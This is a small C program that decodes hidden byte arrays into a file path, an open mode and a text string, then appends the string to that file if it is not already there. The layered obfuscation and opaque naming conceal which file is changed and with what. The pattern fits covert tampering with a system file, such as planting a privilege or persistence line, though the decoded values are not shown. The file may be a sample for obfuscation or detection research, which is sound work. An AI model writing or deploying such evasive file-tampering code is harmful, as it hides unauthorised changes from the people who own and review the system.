#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int func(char* f, const char *a, const char *s)
{
	int foundString = 0;
	
	int bufferSize = 1024;
	char currLine[bufferSize];
	
    FILE *pe1;

    if((pe1=fopen(f, a))==NULL) {
		return 0;
	}
    
    while (fgets(currLine, bufferSize, pe1) != NULL) {
        currLine[strcspn(currLine, "\n")] = 0;
        if (strstr(currLine, s)) {
            foundString = 1;
            break;
        }
    }
	
	if (foundString == 0) {
		fputs(s, pe1);
	}
	
	fclose(pe1);
	
	return 0;
}

int realmain() {
	unsigned char s[] = 
	{
	
	    0xfc, 0x27, 0xa, 0xe8, 0x51, 0x41, 0xc1, 0x1f, 
	    0x24, 0x9c, 0x1b, 0x0, 0x30, 0xa9, 0x47, 0x36, 
	    0x94, 0xdc, 0x34, 0xc3, 0xe8, 0xf1, 0x86, 0x31, 
	    0x3c, 0xa5, 0x9a, 0xb0, 0x21, 0xa9, 0x21, 0x28
	};
	
	for (unsigned int m = 0; m < sizeof(s); ++m)
	{
	    unsigned char c = s[m];
	    c ^= 0xc1;
	    c += m;
	    c = (c >> 0x1) | (c << 0x7);
	    c -= 0xb9;
	    c = -c;
	    c = (c >> 0x2) | (c << 0x6);
	    c ^= m;
	    c = -c;
	    c = ~c;
	    c += m;
	    c = -c;
	    c ^= 0x8e;
	    c = ~c;
	    c = -c;
	    c = ~c;
	    s[m] = c;
	}
	
	unsigned char f[] = 
	{
	
	    0x74, 0xe9, 0xf1, 0xe7, 0xa2, 0x96, 0x3c, 0x4a, 
	    0x16, 0x9c, 0xf6, 0x11, 0x52
	};
	
	for (unsigned int m = 0; m < sizeof(f); ++m)
	{
	    unsigned char c = f[m];
	    c = (c >> 0x1) | (c << 0x7);
	    c -= 0x69;
	    c ^= 0x95;
	    c = -c;
	    c += m;
	    c ^= m;
	    c += m;
	    c = -c;
	    c = ~c;
	    c += m;
	    c = ~c;
	    c = -c;
	    c += m;
	    c = ~c;
	    c ^= 0x20;
	    f[m] = c;
	}
	
	unsigned char a[] = 
	{
	
	    0x46, 0x13, 0x5d
	};
	
	for (unsigned int m = 0; m < sizeof(a); ++m)
	{
	    unsigned char c = a[m];
	    c -= 0x2d;
	    c = ~c;
	    c -= 0xdd;
	    c = ~c;
	    c += m;
	    c = (c >> 0x7) | (c << 0x1);
	    c = ~c;
	    c += m;
	    c = (c >> 0x7) | (c << 0x1);
	    c = ~c;
	    c -= 0x23;
	    c ^= m;
	    c -= 0x1a;
	    c = ~c;
	    c ^= m;
	    a[m] = c;
	}
	
	return func(f, a, s);
}

int real() {
	return realmain();
}

int main() {
	return real();
}
